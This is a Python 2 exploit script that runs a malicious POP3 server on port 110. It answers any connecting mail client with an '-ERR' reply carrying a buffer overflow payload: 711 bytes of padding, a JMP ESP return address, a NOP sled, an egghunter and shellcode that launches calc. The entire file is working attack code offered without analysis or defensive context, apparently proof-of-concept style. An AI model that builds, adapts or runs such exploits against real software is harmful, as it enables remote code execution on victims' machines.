#!/usr/bin/python
import sys
import socket
import struct

#egghunter 

egghunter =  ""
egghunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"


shellcode = "\x31\xC9"                  # xor ecx,ecx
shellcode += "\x51"                     # push ecx
shellcode += "\x68\x63\x61\x6C\x63"     # push 0x636c6163
shellcode += "\x54"                     # push dword ptr esp
shellcode += "\xB8\xC7\x93\xC2\x77"     # mov eax,0x77c293c7
shellcode += "\xFF\xD0"                 # call eax


junk = "A" * 711

eip = struct.pack("<L",0x7E429353) # 7E429353   FFE4             JMP ESP

nops = "\x90" * 25

payload = junk + eip + nops + egghunter + "w00tw00t" + shellcode

print payload

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(('', 110))
	s.listen(1)
	print "\nDone! Wonder if we got that shell back?"
	conn, addr = s.accept()
	print '[*] Received connection from: ', addr

	while True:
		conn.send("-ERR "+payload)
	conn.close()
except:
	print "[*] Done."
